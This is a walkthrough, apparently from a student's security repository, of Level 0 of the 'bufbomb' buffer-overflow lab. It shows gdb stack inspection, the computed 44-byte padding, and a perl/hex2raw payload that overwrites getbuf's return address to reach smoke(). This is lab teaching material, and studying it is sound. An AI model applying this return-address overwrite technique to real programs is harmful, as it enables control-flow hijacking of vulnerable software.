# Level 0: Candle	( Hai Dang )
The BUFBOMB program reads a string from standard input. It does so with the function `getbuf`
overrunning the buffer typically causes the program state to be corrupted leading to a memory 
access error. By exploiting this vulnerable memory, we can attack the file to get information 
In particular, in this level, we will exploit and make program run the function `smoke` when
`getbuf` executes its return statement.

Method: providing a enough long string to make getbuf overflow. And then, we can take
control execute program by putting return address on stack memory on EAX register 

## Start: 

1. At the beginning, getting assembly code from execute bufbomb file, and create id cookie
following command:

```
objdump -d bufbomb > assembly.txt
danghai@babbage:~/buflab-handout$ ./makecookie danghai
0x2b9b4cfd
danghai@babbage:~/buflab-handout$ 
```

2. Finding the address function `smoke` in BUFBOMB assembly 
```
danghai@babbage:~/buflab-handout$ grep -i "smoke" assembly.txt
08048cea <smoke>:
```
The address for `smoke` function = `0x08048cea`

3. Calculating the length of the string size of stack memory
```
danghai@babbage:~/buflab-handout$ gdb bufbomb
(gdb) break getbuf
(gdb) run -u danghai
(gdb) break *getbuf+17
(gdb) disas

```

Result:
```asm
(gdb) disas
Dump of assembler code for function getbuf:
   0x080490ce <+0>:	push   %ebp
   0x080490cf <+1>:	mov    %esp,%ebp
   0x080490d1 <+3>:	sub    $0x38,%esp
=> 0x080490d4 <+6>:	lea    -0x28(%ebp),%eax
   0x080490d7 <+9>:	mov    %eax,(%esp)
   0x080490da <+12>:	call   0x8048b4a <Gets>
   0x080490df <+17>:	mov    $0x1,%eax
   0x080490e4 <+22>:	leave  
   0x080490e5 <+23>:	ret    
End of assembler dump.
```
Arrow indicating breakpoint when setting at `getbuf` function. The goal is to push the string
onto stack memory locating `%ebp`. It means that we need to know the address of `%ebp`
```
(gdb) info registers
```

Result:
```asm
(gdb) info registers
eax            0x3d057629	1023768105
ecx            0x3d057629	1023768105
edx            0xf7fa03e4	-134609948
ebx            0x0	0
esp            0x55683098	0x55683098 <_reserved+1036440>
ebp            0x556830d0	0x556830d0 <_reserved+1036496>
esi            0x55686420	1432904736
edi            0xee0	3808
eip            0x80490d4	0x80490d4 <getbuf+6>
eflags         0x212	[ AF IF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
```
The value of `%ebp` is : `0x556830d0`. getBuf() will take 32 bytes. To modify the return address for 
`smoke` function, We need to look at the stack to determine the buffer size by throw `"garbage"` string into stack. 
Quit gdb, and creating the string to attack buffer. 
```
danghai@babbage:~/buflab-handout$ perl -e 'print "A"x32 '> hex
danghai@babbage:~/buflab-handout$ gdb bufbomb
(gdb) break getbuf
(gdb) break *getbuf+17
(gdb) run -u danghai < hex
(gdb) x/20x $esp
(gdb) disas
```
Result: stack memory stores before call `getbuf()` function
```asm
(gdb) x/20x $esp
0x55683098 <_reserved+1036440>:	0x000025e8	0xf7fa03e4	0xf7fa1870	0x58dfca87
0x556830a8 <_reserved+1036456>:	0x00000000	0xf7e1f21d	0x00000000	0x08048b48
0x556830b8 <_reserved+1036472>:	0x000025e8	0x0804844c	0x00000000	0x00000000
0x556830c8 <_reserved+1036488>:	0x00000000	0xf7df7808	0x55683100	0x08048d28
0x556830d8 <_reserved+1036504>:	0x55686420	0x00000ee0	0x55685ff0	0xf7e39046

```
Continue executing to display stack memory after calling `getbuf()` function
```
(gdb) continue
(gdb) disas
(gdb) x/20x $esp
```
Assembly execute:
```asm
Breakpoint 2, 0x080490df in getbuf ()
(gdb) disas
Dump of assembler code for function getbuf:
   0x080490ce <+0>:	push   %ebp
   0x080490cf <+1>:	mov    %esp,%ebp
   0x080490d1 <+3>:	sub    $0x38,%esp
   0x080490d4 <+6>:	lea    -0x28(%ebp),%eax
   0x080490d7 <+9>:	mov    %eax,(%esp)
   0x080490da <+12>:	call   0x8048b4a <Gets>
=> 0x080490df <+17>:	mov    $0x1,%eax
   0x080490e4 <+22>:	leave  
   0x080490e5 <+23>:	ret    
End of assembler dump.
```
Stack memory: stores after call `getbuf()` function
```asm
(gdb) x/20x $esp
0x55683098 <_reserved+1036440>:	0x556830a8	0xf7fa03e4	0xf7fa1870	0x58dfca87
0x556830a8 <_reserved+1036456>:	0x41414141	0x41414141	0x41414141	0x41414141
0x556830b8 <_reserved+1036472>:	0x41414141	0x41414141	0x41414141	0x41414141
0x556830c8 <_reserved+1036488>:	0x00000000	0xf7df7808	0x55683100	0x08048d28
0x556830d8 <_reserved+1036504>:	0x55686420	0x00000ee0	0x55685ff0	0xf7e39046
```
We can see that the `buffer` variable stores its 32 byte string on the stack. 
Starting at address `0x556830a8` and ending at address `0x556830c8`.



buffer size = address at `%ebp` +4 - starting address `%esp` = `0x556830d0` +4 - 556830a8 = 44 bytes 

32 bytes are used to store the `buffer` variable as seen after giving the "hex" file as input

44 - 32 = 12 bytes left to fill the stack right before the return address(* IMPORTANT: 
after filling The rest 12 bytes, the next address in stack reserve for returning address for `smoke` function)

4. force the function getbuf to return to fucntion smoke() instead of returning the value 1.

The address for `smoke` function = `0x08048cea`. Because memory is organized by Little Endian
So `08 04 8c ea` => `ea 8c 04 08` (Reverse order). Now using the hex2raw executable file to convert the 
hex1(44 bytes + return address `smoke` function) text file into a raw file, and then run BUFBOMB file to see the result
```
danghai@babbage:~/buflab-handout$ perl -e 'print "61 "x32, "BB "x4, "CC "x4, "DD "x4, "ea 8c 04 08" '>hex1
danghai@babbage:~/buflab-handout$ ./hex2raw <hex1> exploit_0
```

5. BOMB!!! run the `exploit_0` file as input to the Buffer Bomb: `danghai@babbage:~/buflab-handout$ ./bufbomb -u danghai < exploit_0`

Result: 
```
Userid: danghai
Cookie: 0x2b9b4cfd
Type string:Smoke!: You called smoke()
VALID
NICE JOB!
```

[NEXT LEVEL](https://github.com/danghai/Security_Exploit/blob/master/bufbomb/Exploit_1.md)


















